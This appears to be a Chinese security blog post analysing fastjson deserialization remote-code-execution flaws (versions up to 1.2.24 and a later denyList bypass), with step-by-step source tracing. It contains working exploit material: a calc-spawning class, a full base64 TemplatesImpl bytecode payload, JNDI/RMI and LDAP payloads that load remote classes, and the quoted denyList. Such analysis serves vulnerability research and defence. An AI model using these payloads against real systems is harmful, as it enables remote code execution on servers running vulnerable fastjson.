<!DOCTYPE HTML>
<html  lang="zh-CN">
<head>
    <meta http-equiv="Content-Type" charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1">
    <meta name="renderer" content="webkit">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    <title>Java 反序列化漏洞始末（3）— fastjson - 浅蓝 's blog</title>
	
    <!-- 使用url函数转换相关路径 -->
	<script src="https://cdn.bootcss.com/jquery/3.3.1/jquery.min.js" data-no-instant></script>
	<script src="/usr/themes/Bigfa/static/js/lately.min.js" data-no-instant></script>
    <link rel="stylesheet" href="/usr/themes/Bigfa/static/css/style.css">
	

    <!-- 通过自有函数输出HTML头部信息 -->
    <meta name="description" content="哔哔两句JSON 在 Java 的反序列化漏洞中也算得上是一个重灾区，在开发者最常用的几个 JSON 类库都被爆出来过漏洞。它们通常会被当做缓存数据，存储在 redis 这种缓存服务器中，或者通..." />
<meta name="generator" content="Typecho 1.1/17.10.30" />
<meta name="template" content="Bigfa" />
<link rel="alternate" type="application/rss+xml" title="Java 反序列化漏洞始末（3）— fastjson &raquo; 浅蓝 's blog &raquo; RSS 2.0" href="https://b1ue.cn/feed/archives/184.html" />
<link rel="alternate" type="application/rdf+xml" title="Java 反序列化漏洞始末（3）— fastjson &raquo; 浅蓝 's blog &raquo; RSS 1.0" href="https://b1ue.cn/feed/rss/archives/184.html" />
<link rel="alternate" type="application/atom+xml" title="Java 反序列化漏洞始末（3）— fastjson &raquo; 浅蓝 's blog &raquo; ATOM 1.0" href="https://b1ue.cn/feed/atom/archives/184.html" />
<script type="text/javascript">
(function () {
    window.TypechoComment = {
        dom : function (id) {
            return document.getElementById(id);
        },
    
        create : function (tag, attr) {
            var el = document.createElement(tag);
        
            for (var key in attr) {
                el.setAttribute(key, attr[key]);
            }
        
            return el;
        },

        reply : function (cid, coid) {
            var comment = this.dom(cid), parent = comment.parentNode,
                response = this.dom('respond-post-184'), input = this.dom('comment-parent'),
                form = 'form' == response.tagName ? response : response.getElementsByTagName('form')[0],
                textarea = response.getElementsByTagName('textarea')[0];

            if (null == input) {
                input = this.create('input', {
                    'type' : 'hidden',
                    'name' : 'parent',
                    'id'   : 'comment-parent'
                });

                form.appendChild(input);
            }

            input.setAttribute('value', coid);

            if (null == this.dom('comment-form-place-holder')) {
                var holder = this.create('div', {
                    'id' : 'comment-form-place-holder'
                });

                response.parentNode.insertBefore(holder, response);
            }

            comment.appendChild(response);
            this.dom('cancel-comment-reply-link').style.display = '';

            if (null != textarea && 'text' == textarea.name) {
                textarea.focus();
            }

            return false;
        },

        cancelReply : function () {
            var response = this.dom('respond-post-184'),
            holder = this.dom('comment-form-place-holder'), input = this.dom('comment-parent');

            if (null != input) {
                input.parentNode.removeChild(input);
            }

            if (null == holder) {
                return true;
            }

            this.dom('cancel-comment-reply-link').style.display = 'none';
            holder.parentNode.insertBefore(response, holder);
            return false;
        }
    };
})();
</script>
<script type="text/javascript">
(function () {
    var event = document.addEventListener ? {
        add: 'addEventListener',
        triggers: ['scroll', 'mousemove', 'keyup', 'touchstart'],
        load: 'DOMContentLoaded'
    } : {
        add: 'attachEvent',
        triggers: ['onfocus', 'onmousemove', 'onkeyup', 'ontouchstart'],
        load: 'onload'
    }, added = false;

    document[event.add](event.load, function () {
        var r = document.getElementById('respond-post-184'),
            input = document.createElement('input');
        input.type = 'hidden';
        input.name = '_';
        input.value = (function () {
    var _YudyMOR = //'gD'
'e'+//'uM'
'0e'+''///*'67T'*/'67T'
+//'Y'
'9c'+'52'//'E4'
+''///*'u8'*/'u8'
+//'kiL'
'c'+//'q'
'2'+''///*'I'*/'I'
+//'c8'
'c8'+//'Exj'
'b'+'43'//'T'
+'1'//'KMs'
+''///*'zR'*/'zR'
+''///*'Mz'*/'Mz'
+'4'//'pT'
+//'E'
'6e'+'a57'//'vp'
+''///*'Sv9'*/'Sv9'
+//'Dd'
'd'+//'k1u'
'904'+'b'//'rK'
+'3'//'5'
+//'F'
'4f'+'f'//'FP'
+'4'//'U0'
+//'5D'
'3a8', _TNq = [[9,11]];
    
    for (var i = 0; i < _TNq.length; i ++) {
        _YudyMOR = _YudyMOR.substring(0, _TNq[i][0]) + _YudyMOR.substring(_TNq[i][1]);
    }

    return _YudyMOR;
})();

        if (null != r) {
            var forms = r.getElementsByTagName('form');
            if (forms.length > 0) {
                function append() {
                    if (!added) {
                        forms[0].appendChild(input);
                        added = true;
                    }
                }
            
                for (var i = 0; i < event.triggers.length; i ++) {
                    var trigger = event.triggers[i];
                    document[event.add](trigger, append);
                    window[event.add](trigger, append);
                }
            }
        }
    });
})();
</script><link rel="stylesheet" type="text/css" href="/usr/plugins/ColorHighlight/res/styles/customemin.css" /><link rel="stylesheet" type="text/css" href="/usr/plugins/ColorHighlight/res/lines.css" /></head>

<body class="is-enableBrandingButtons is-js">
  <div class="site-main surface-container"> 
    <div class="butterBar"><p class="butterBar-message"></p></div> 
   
   <header class="metabar metabar--bordered metabar--top u-clearfix"> 
    <div class="metabar-block u-floatLeft" itemprop="publisher" itemscope="" itemtype="https://schema.org/Organization"> 
     <h1 class="site-title u-floatLeft" itemprop="logo" itemscope="" itemtype="https://schema.org/ImageObject"> <a href="https://b1ue.cn/" class="logo" title="浅蓝 's blog"> <img src="/logo.png" width="38" /></a></h1>  
    </div> 
    <div class="metabar-block metabar-center"> 
		 <nav class="navTabs navTabs--metabar navTabs--narrow" itemtype="http://schema.org/SiteNavigationElement" itemscope=""> 
			 <div class="layoutSingleColumn layoutSingleColumn--wide">
				  <ul class="subnav-ul">
										<li  class="subnav-li"><a class="subnav-item" href="https://b1ue.cn/category.html">分类</a></li><li  class="subnav-li"><a class="subnav-item" href="https://b1ue.cn/archives.html">归档</a></li><li  class="subnav-li"><a class="subnav-item" href="https://b1ue.cn/links.html">友情链接</a></li><li  class="subnav-li"><a class="subnav-item" href="https://b1ue.cn/about.html">关于我</a></li>									  </ul>
			 </div>
		</nav> 
    </div> 
    <div class="metabar-block u-floatRight"> 
     <form id="search" class="metabar-predictiveSearch search-form" action="https://b1ue.cn/" role="search" method="GET"> 
        <label title="Search 浅蓝 's blog"> 
        <svg xmlns="http://www.w3.org/2000/svg" style="display:none;">
          <symbol viewBox="0 0 25 25" id="svg-search">
            <title>svg-search</title>
            <path d="M20.067 18.933l-4.157-4.157c.837-1.032 1.34-2.345 1.34-3.776 0-3.314-2.686-6-6-6s-6 2.686-6 6 2.686 6 6 6c1.43 0 2.744-.503 3.776-1.34l4.157 4.157c.113.113.27.183.442.183.345 0 .625-.28.625-.625 0-.173-.07-.33-.183-.442zM6.5 11c0-2.62 2.13-4.75 4.75-4.75S16 8.38 16 11s-2.13 4.75-4.75 4.75S6.5 13.62 6.5 11z"
            />
          </symbol>
        </svg>
        <svg viewBox="0 0 25 25" width="25" height="25" class="svgIcon">
            <use class="svgIcon-use" xlink:href="#svg-search">
            </use>
        </svg>
         <input id="input" class="textInput textInput--dark textInput--rounded" name="s" type="text" required="true" placeholder="Search 浅蓝 's blog" /> 
  	   </label>
     </form> 
    </div> 
   </header>


    
    

<div class="layoutSingleColumn">
    <article class="u-paddingTop50" itemscope="itemscope" itemtype="http://schema.org/Article">
      <header class="entry-header">
        <h2 class="entry-title" itemprop="headline">Java 反序列化漏洞始末（3）— fastjson</h2>
        <div class="entry-meta">
            <a><time class="lately-a" datetime="2019-07-08 22:41:00" itemprop="datePublished">2019-07-08 22:41:00</time></a>
            <span class="middotDivider"></span>
            <a href="https://b1ue.cn/archives/184.html"><a href="https://b1ue.cn/category/vul/">漏洞</a></a>
        </div>
      </header>

      <meta itemscope itemprop="mainEntityOfPage"  itemType="https://schema.org/WebPage" itemid="https://b1ue.cn/archives/184.html"/>

        <div class="grap" itemprop="articleBody">
            <h1>哔哔两句</h1><p>JSON 在 Java 的反序列化漏洞中也算得上是一个重灾区，在开发者最常用的几个 JSON 类库都被爆出来过漏洞。</p><p>它们通常会被当做缓存数据，存储在 redis 这种缓存服务器中，或者通过 rest 交互时对 JSON 数据进行解析，问题大多出现在这两种场景下。</p><p>开发者常用的主要就是 jackson fastjson 这两个 JSON 处理类库</p><p>这篇文章主要先对 fastjson 的两个反序列化漏洞做一下分析记录</p><h1>Fastjson 反序列化 1</h1><p>这是2017年官方自己爆出来的一个反序列化漏洞'</p><p>影响范围在&lt;= 1.2.24 的版本</p><h2>复现</h2><p>首先来了解一下 FastJSON 是如何序列化与反序列化对象的。</p><pre><code>        Person person = new Person();
        person.name=&quot;blue&quot;;
        person.length=18;

        String s = JSONObject.toJSONString(person);
        String s1 = JSONObject.toJSONString(person, SerializerFeature.WriteClassName);

        System.out.println(s);
        System.out.println(s1);

        Object parse = JSON.parse(s);
        Object parse1 = JSON.parse(s1);

        System.out.println(&quot;type:&quot;+ parse.getClass().getName() +&quot; &quot;+parse);
        System.out.println(&quot;type:&quot;+ parse1.getClass().getName() +&quot; &quot;+parse1);
</code></pre><p>这里实例化了一个 Person 对象，转了两次JSON字符串，又分别进行了两次 JSON 对象解析。</p><pre><code>{&quot;length&quot;:18,&quot;name&quot;:&quot;blue&quot;}
{&quot;@type&quot;:&quot;simple.Person&quot;,&quot;length&quot;:18,&quot;name&quot;:&quot;blue&quot;}
type:com.alibaba.fastjson.JSONObject {&quot;name&quot;:&quot;blue&quot;,&quot;length&quot;:18}
type:simple.Person Person{name='blue', length=18}</code></pre><p>从结果来看，使用了 SerializerFeature.WriteClassName 比上一个JSON字符串多出来了一个 "@type"属性</p><p>而且在字符串转JSON对象的时候，第一个是被转成了 JSONObject 对象，第二个被反序列化回了 Person 类型的对象。</p><p>由此可知 @type 是用于在解析 JSON 时指定类的。</p><p>先弹他一个计算器。</p><p><strong>Test.java</strong></p><pre><code>/**
 * @author 浅蓝
 * @email <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="c9aba5bcac89a0b1baacaae7a6bbae">[email&#160;protected]</a>
 * @since 2019/7/8 11:05
 */
import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;

import java.io.IOException;

public class Test extends AbstractTranslet {
    public Test() throws IOException {
        Runtime.getRuntime().exec(&quot;calc&quot;);
    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) {
    }

    @Override
    public void transform(DOM document, com.sun.org.apache.xml.internal.serializer.SerializationHandler[] handlers) throws TransletException {

    }

    public static void main(String[] args) throws Exception {
        Test t = new Test();
    }
}
</code></pre><p><strong>FastJson.java</strong></p><pre><code>/**
 * @author 浅蓝
 * @email <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="fd9f918898bd94858e989ed3928f9a">[email&#160;protected]</a>
 * @since 2019/7/8 10:52
 */
public class FastJson {

    public static String readClass(String cls){
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        try {
            IOUtils.copy(new FileInputStream(new File(cls)), bos);
        } catch (IOException e) {
            e.printStackTrace();
        }
        return Base64.encodeBase64String(bos.toByteArray());

    }

    public static void main(String[] args) throws Exception {

        ParserConfig config = new ParserConfig();
        final String evilClassPath = System.getProperty(&quot;user.dir&quot;) + &quot;\\target\\classes\\json\\Test.class&quot;;
        String evilCode = readClass(evilClassPath);
        final String NASTY_CLASS = &quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;;
        String text1 = &quot;{\&quot;@type\&quot;:\&quot;&quot; + NASTY_CLASS +
                &quot;\&quot;,\&quot;_bytecodes\&quot;:[\&quot;&quot;+evilCode+&quot;\&quot;],&quot; +
                &quot;'_name':'a.b',&quot; +
                &quot;'_tfactory':{ },&quot; +
                &quot;\&quot;_outputProperties\&quot;:{ }}\n&quot;;
        System.out.println(text1);
        Object obj = JSON.parseObject(text1, Object.class, config, Feature.SupportNonPublicField);

    }

}</code></pre><p><strong>Payload</strong></p><pre><code>{&quot;@type&quot;:&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;,&quot;_bytecodes&quot;:[&quot;yv66vgAAADIANAoABwAlCgAmACcIACgKACYAKQcAKgoABQAlBwArAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAAtManNvbi9UZXN0OwEACkV4Y2VwdGlvbnMHACwBAAl0cmFuc2Zvcm0BAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIZG9jdW1lbnQBAC1MY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTsBAAhpdGVyYXRvcgEANUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7AQAHaGFuZGxlcgEAQUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQByKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIaGFuZGxlcnMBAEJbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsHAC0BAARtYWluAQAWKFtMamF2YS9sYW5nL1N0cmluZzspVgEABGFyZ3MBABNbTGphdmEvbGFuZy9TdHJpbmc7AQABdAcALgEAClNvdXJjZUZpbGUBAAlUZXN0LmphdmEMAAgACQcALwwAMAAxAQAEY2FsYwwAMgAzAQAJanNvbi9UZXN0AQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAE2phdmEvaW8vSU9FeGNlcHRpb24BADljb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvVHJhbnNsZXRFeGNlcHRpb24BABNqYXZhL2xhbmcvRXhjZXB0aW9uAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwAhAAUABwAAAAAABAABAAgACQACAAoAAABAAAIAAQAAAA4qtwABuAACEgO2AARXsQAAAAIACwAAAA4AAwAAABEABAASAA0AEwAMAAAADAABAAAADgANAA4AAAAPAAAABAABABAAAQARABIAAQAKAAAASQAAAAQAAAABsQAAAAIACwAAAAYAAQAAABcADAAAACoABAAAAAEADQAOAAAAAAABABMAFAABAAAAAQAVABYAAgAAAAEAFwAYAAMAAQARABkAAgAKAAAAPwAAAAMAAAABsQAAAAIACwAAAAYAAQAAABwADAAAACAAAwAAAAEADQAOAAAAAAABABMAFAABAAAAAQAaABsAAgAPAAAABAABABwACQAdAB4AAgAKAAAAQQACAAIAAAAJuwAFWbcABkyxAAAAAgALAAAACgACAAAAHwAIACAADAAAABYAAgAAAAkAHwAgAAAACAABACEADgABAA8AAAAEAAEAIgABACMAAAACACQ=&quot;],'_name':'a.b','_tfactory':{ },&quot;_outputProperties&quot;:{ }}</code></pre><p><img src="/usr/uploads/2019/07/3949223860.jpg" alt="1562599286(1).jpg" title="1562599286(1).jpg"></p><p>从这几行代码来看，其实就是将 Test.java 编译后的字节码转成 Base64 然后拼接到了一个 JSON 字符串中，最后使用 JSON.parseObject 方法解析成 Java 对象。</p><p>在这个 JSON 字符串中可以看得到几个关键字 <code>TemplatesImpl</code>、<code>outputProperties</code>、<code>_bytecodes</code>，我在上一篇文章《Java 反序列化漏洞始末（2）— JDK》中就有讲到过，这是利用了 JDK 1.7 的类触发了漏洞，其中原理不再细讲，只需要知道调用<code>TemplatesImpl.getOutputProperties()</code>会触发漏洞代码。</p><p>在上面的代码可以看到有用到一个 Feature.SupportNonPublicField 的参数，实际上这种情况很少会被用到。</p><p>其作用就是支持反序列化使用非public修饰符保护的属性。</p><p>上面的那段JSON 里的大部分属性都是私有的，所以需要用到这个参数，其原理不再细究。</p><p>这里主要以 JNDI 注入为例讲解。先给出 Payload</p><pre><code>{&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;rmi://127.0.0.1:1999/Exploit&quot;,&quot;autoCommit&quot;:true}</code></pre><p>先从这段 JSON 的字面意思上来理解一下他做了什么。</p><ol><li>首先指定了该对象要反序列化的类为 com.sun.rowset.JdbcRowSetImpl</li><li>设定属性 dataSourceName rmi://127.0.0.1:1999/Exploit ，实际上是在调用 setDataSourceName 方法</li><li>设定 autoCommit 属性为 true，实际上也是在调用其 setter 方法</li></ol><p>根据猜想，应该是做了这几件事</p><pre><code>        JdbcRowSetImpl jdbcRowSet = new JdbcRowSetImpl();

        jdbcRowSet.setDataSourceName(&quot;rmi://127.0.0.1:1999/Exploit&quot;);

        jdbcRowSet.setAutoCommit(true);</code></pre><p>在 setAutoCommit 方法中判断了如果 connect 为空就去调用 connect 方法。</p><pre><code>    protected Connection connect() throws SQLException {
        if (this.conn != null) {
            return this.conn;
        } else if (this.getDataSourceName() != null) {
            try {
                InitialContext var1 = new InitialContext();
                DataSource var2 = (DataSource)var1.lookup(this.getDataSourceName()); // 在这一步去连接 DataSource ，触发 JNDI 注入
                return this.getUsername() != null &amp;&amp; !this.getUsername().equals(&quot;&quot;) ? var2.getConnection(this.getUsername(), this.getPassword()) : var2.getConnection();
            } catch (NamingException var3) {
                throw new SQLException(this.resBundle.handleGetObject(&quot;jdbcrowsetimpl.connect&quot;).toString());
            }
        } else {
            return this.getUrl() != null ? DriverManager.getConnection(this.getUrl(), this.getUsername(), this.getPassword()) : null;
        }
    }</code></pre><p>在注释处调用了 InitialContext 对象的 lookup 方法触发  JNDI 注入</p><p>现在复现一遍这个 JNDI 注入版的 payload</p><p><strong>JNDI Server</strong></p><pre><code>public class JNDIServer {
    public static void start() throws
            AlreadyBoundException, RemoteException, NamingException {
        Registry registry = LocateRegistry.createRegistry(1999);
        Reference reference = new Reference(&quot;Exploit&quot;,
                &quot;Exploit&quot;,&quot;http://127.0.0.1/&quot;);
        ReferenceWrapper referenceWrapper = new ReferenceWrapper(reference);
        registry.bind(&quot;Exploit&quot;,referenceWrapper);
    }
    public static void main(String[] args) throws RemoteException, NamingException, AlreadyBoundException {
        start();

    }
}</code></pre><p><strong>Exploit.java</strong></p><pre><code>public class Exploit {
    public Exploit(){
        try{
            Runtime.getRuntime().exec(&quot;calc&quot;);
        }catch(Exception e){
            e.printStackTrace();
        }
    }
    public static void main(String[] argv){
        Exploit e = new Exploit();
    }
}</code></pre><p>在解析 JSON 之前需要先将 Exploit.java 编译为 Exploit.class，然后放置本地 80 端口服务器下</p><p>使 <a href="http://127.0.0.1/Exploit.class" target="_blank">http://127.0.0.1/Exploit.class</a> 可正常访问到该文件内容</p><p>然后启动 JDNIServer 绑定本地 1999 端口，最后使用 fastjson 解析该 payload。</p><p>解析的过程中会去访问 127.0.0.1 的 1999 端口，该端口绑定着 RMI 服务，RMI 服务又会去 127.0.0.1 80 端口的 WEB 服务访问 Exploit.class，最后初始化该对象，触发执行系统命令的代码。</p><p><img src="/usr/uploads/2019/07/3577141999.jpg" alt="1563438843(1).jpg" title="1563438843(1).jpg"></p><h2>分析</h2><p>现在对这个问题进一步的分析一下（无论想知道哪个RCE漏洞的原理，只要在最终被调用的地方打个断点就什么都知道了）</p><p><img src="/usr/uploads/2019/07/1696957718.jpg" alt="1563718832(1).jpg" title="1563718832(1).jpg"></p><p>在 JSON 类的 parse 方法最后是实例化了一个 <code>DefaultJSONParser</code> 对象又调用了其 <code>parse()</code> 方法</p><p>跟踪 <code>parse()</code> 方法</p><pre><code>public Object parse(Object fieldName) {
        JSONLexer lexer = this.lexer;
        switch(lexer.token()) {
        case 1:
        case 5:
        case 10:
//....</code></pre><p>发现这里根据 this.lexer.token() 做了一个 switch 判断</p><p>这个 lexer 属性实际上是在 DefaultJSONParser 对象被实例化的时候创建的</p><pre><code>    public DefaultJSONParser(String input, ParserConfig config, int features) {
        this(input, new JSONScanner(input, features), config);
    }</code></pre><p>这一步调用的另外一个构造函数</p><pre><code>public DefaultJSONParser(Object input, JSONLexer lexer, ParserConfig config) {
    //.....
}</code></pre><p>lexer 也就是 new JSONScanner(input, features) </p><p>继续跟进，在这个 <code>DefaultJSONParser</code> 构造方法里 124 行的位置调用了 <code>lexer.getCurrent()</code> </p><p>这里实际上是获取 lexer 的 <code>ch</code> 属性。</p><p>在 JSONScanner 对象被实例化的时候调用了 next() 方法</p><p>在这个方法中对 <code>ch</code> 属性赋了值</p><pre><code>public final char next() {
        int index = ++this.bp;
        return this.ch = index &gt;= this.len ? '\u001a' : this.text.charAt(index);
}</code></pre><p>在实例化时第一次被调用，所以获取的是 JSON 字符串的第一个字符，既 <code>{</code></p><pre><code>        int ch = lexer.getCurrent();
        if (ch == '{') {
            lexer.next();
            ((JSONLexerBase)lexer).token = 12;
        } else if (ch == '[') {
            lexer.next();
            ((JSONLexerBase)lexer).token = 14;
        } else {
            lexer.nextToken();
        }</code></pre><p>所以在 <code>DefaultJSONParser</code> 构造方法里这段代码意思就很简单了，判断第一个字符串如果是 <code>{</code> 的话就让 lexer 对象的 token 属性值为 12</p><p>继续回到 <code>parse</code> 方法的 switch 判断点处。</p><p>目前已知第一个字符是 <code>{</code> 对应 token <code>12</code></p><pre><code>        case 12:
            JSONObject object = new JSONObject(lexer.isEnabled(Feature.OrderedField));
            return this.parseObject((Map)object, fieldName);</code></pre><p>所以应进入 <code>case 12</code> 的分支</p><p>这里 new 了一个 JSONObject 对象<br>然后调用 <code>DefaultJSONParser#parseObject(java.util.Map, java.lang.Object)</code> 方法去解析，filedName 参数此处为 null，因为还没有开始解析 JSON 里的字段</p><p>进入此方法后先检测了 JSON 格式是否合规后，判断下一个字符串是否为 <code>&quot;</code></p><pre><code>    if (ch == '&quot;') {
              key = lexer.scanSymbol(this.symbolTable, '&quot;');//取出&quot;&quot;中的键名 即 @type
              lexer.skipWhitespace();
              ch = lexer.getCurrent();
              if (ch != ':') {
                   throw new JSONException(&quot;expect ':' at &quot; + lexer.pos() + &quot;, name &quot; + key);
              }
    }</code></pre><p>在JSON串中<code>{</code>下一个是<code>&quot;</code>，自然符合判断，然后接着向后读取</p><pre><code>  ch = lexer.getCurrent();
  lexer.resetStringPosition();
  Object obj;
  Object instance;
  String ref;
  Object thisObj;
  if (key == JSON.DEFAULT_TYPE_KEY &amp;&amp; !lexer.isEnabled(Feature.DisableSpecialKeyDetect)) {
        ref = lexer.scanSymbol(this.symbolTable, '&quot;'); // 获取 @type 对应的值 com.sun.rowset.JdbcRowSetImpl
        Class&lt;?&gt; clazz = TypeUtils.loadClass(ref, this.config.getDefaultClassLoader());
        if (clazz != null) {
            //...
        }
        //...
   }
</code></pre><p><code>key == JSON.DEFAULT_TYPE_KEY</code> 去判断取出来的键是否和<code>JSON.DEFAULT_TYPE_KEY</code>相等</p><pre><code>public static String DEFAULT_TYPE_KEY = &quot;@type&quot;;
</code></pre><p>接着又取出了 @type 的值，交给<code>TypeUtils.loadClass</code> 方法获取类对象</p><pre><code>public static Class&lt;?&gt; loadClass(String className, ClassLoader classLoader) {
    if (className != null &amp;&amp; className.length() != 0) {
        Class&lt;?&gt; clazz = (Class)mappings.get(className);    // mappings 里缓存了一些常用的基本类型，com.sun.rowset.JdbcRowSetImpl肯定是不在这里的
        if (clazz != null) {
            return clazz;
        } else if (className.charAt(0) == '[') {
            Class&lt;?&gt; componentType = loadClass(className.substring(1), classLoader);
            return Array.newInstance(componentType, 0).getClass();
        } else if (className.startsWith(&quot;L&quot;) &amp;&amp; className.endsWith(&quot;;&quot;)) {
            String newClassName = className.substring(1, className.length() - 1);
            return loadClass(newClassName, classLoader);
        } else {            // 最终走到 最后一个else分支里
            try {
                if (classLoader != null) {
                    clazz = classLoader.loadClass(className);
                    mappings.put(className, clazz);
                    return clazz;
                }
            } catch (Throwable var6) {
                var6.printStackTrace();
            }

            try {
                ClassLoader contextClassLoader = Thread.currentThread().getContextClassLoader();
                if (contextClassLoader != null) {
                    clazz = contextClassLoader.loadClass(className);    // 加载类
                    mappings.put(className, clazz); //将类对象缓存在 mappings 对象
                    return clazz;
                }
            } catch (Throwable var5) {
                ;
            }

            try {
                clazz = Class.forName(className);
                mappings.put(className, clazz);
                return clazz;
            } catch (Throwable var4) {
                return clazz;
            }
        }
    } else {
        return null;
    }
}
</code></pre><p>只要类存在，无论如何这里最终都会将类对象缓存在 mappings 里</p><p>在该版本里，这个地方不重要，和漏洞利用无关，就是顺带讲一下。</p><pre><code>Class&lt;?&gt; clazz = TypeUtils.loadClass(ref, this.config.getDefaultClassLoader());
if (clazz != null) {
    //...
    ObjectDeserializer deserializer = this.config.getDeserializer(clazz); 
    thisObj = deserializer.deserialze(this, clazz, fieldName); // 开始进入反序列化阶段
    return thisObj;
}
</code></pre><p><code>this.config.getDeserializer(clazz);</code> 这一段最终通过 createJavaBeanDeserializer 方法得到 ObjectDeserializer 对象</p><p>反序列化属性的具体方法可以直接跟进到</p><p><code>com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer#deserialze()</code></p><p>里面具体操作就是通过反射调用 setter 方法赋值</p><p>当执行到 JdbcRowSetImpl 对象的 setAutoCommit 方法时，就触发了漏洞</p><h1>Fastjson 反序列化 2</h1><p>这个漏洞是最近被曝出来的，影响范围扩大到了 1.2.47</p><p>原理是通过类缓存绕过反序列化黑名单</p><p>先看看，fastjson 上一个漏洞的安全版本 1.2.25 是如何修复的</p><p>拿之前的 payload 测试解析时会抛出这样异常，意为该类不支持 autotype</p><pre><code>Exception in thread &quot;main&quot; com.alibaba.fastjson.JSONException: autoType is not support. com.sun.rowset.JdbcRowSetImpl</code></pre><p>对比 parseObject 方法</p><p><strong>1.2.24</strong></p><pre><code> ref = lexer.scanSymbol(this.symbolTable, '&quot;');
 Class&lt;?&gt; clazz = TypeUtils.loadClass(ref, this.config.getDefaultClassLoader());</code></pre><p><strong>1.2.25</strong></p><pre><code>ref = lexer.scanSymbol(this.symbolTable, '&quot;');
Class&lt;?&gt; clazz = this.config.checkAutoType(ref, (Class)null);                        </code></pre><p>获取类对象的方法由 <code>TypeUtils.loadClass</code> 变成了<code>this.config.checkAutoType</code></p><p>ParserConfig　类也多了一些东西</p><pre><code>    this.autoTypeSupport = AUTO_SUPPORT;
    this.denyList = &quot;bsh,com.mchange,com.sun.,java.lang.Thread,java.net.Socket,java.rmi,javax.xml,org.apache.bcel,org.apache.commons.beanutils,org.apache.commons.collections.Transformer,org.apache.commons.collections.functors,org.apache.commons.collections4.comparators,org.apache.commons.fileupload,org.apache.myfaces.context.servlet,org.apache.tomcat,org.apache.wicket.util,org.codehaus.groovy.runtime,org.hibernate,org.jboss,org.mozilla.javascript,org.python.core,org.springframework&quot;.split(&quot;,&quot;);
    this.acceptList = AUTO_TYPE_ACCEPT_LIST;
    
</code></pre><p>denyList 可以算是一个包名黑名单，包名开头包含这些了这些黑名单的话就会抛出异常，终止解析 JSON </p><p>追踪到这个 checkAutoType 方法里看一下其中主要的代码</p><pre><code>            if (!this.autoTypeSupport) {        // 如果没有开启 autoType
                String accept;
                int i;
                for(i = 0; i &lt; this.denyList.length; ++i) {     //遍历黑名单
                    accept = this.denyList[i];
                    if (className.startsWith(accept)) {         // 判断类名开头是否包含了黑名单里的包名
                        throw new JSONException(&quot;autoType is not support. &quot; + typeName);
                    }
                }

                for(i = 0; i &lt; this.acceptList.length; ++i) {     // 白名单判断
                    accept = this.acceptList[i];
                    if (className.startsWith(accept)) {
                        clazz = TypeUtils.loadClass(typeName, this.defaultClassLoader);
                        if (expectClass != null &amp;&amp; expectClass.isAssignableFrom(clazz)) {
                            throw new JSONException(&quot;type not match. &quot; + typeName + &quot; -&gt; &quot; + expectClass.getName());
                        }

                        return clazz;
                    }
                }
            }
</code></pre><p>不过，在 1.2.41 版本，有了一种绕过黑名单的方法，但需要开启 autoType，影响不大。</p><pre><code> ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
 JSON.parse(&quot;{\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,\&quot;dataSourceName\&quot;:\&quot;ldap://10.165.93.31:1090/evil\&quot;,\&quot;autoCommit\&quot;:true}&quot;);
</code></pre><p>正常这样解析的话，即使开了 autoType 也会被黑名单拦下来。</p><p>把 @type 改成 <code>Lcom.sun.rowset.JdbcRowSetImpl;</code> 就不一样了</p><p>在 checkAutoType 时因为，<code>Lcom.sun</code> 不符合黑名单<code>com.sun</code> 开头的规则，所以代码会继续走下去</p><p>直到</p><pre><code>   if (clazz == null) {
       clazz = TypeUtils.loadClass(typeName, this.defaultClassLoader, false);
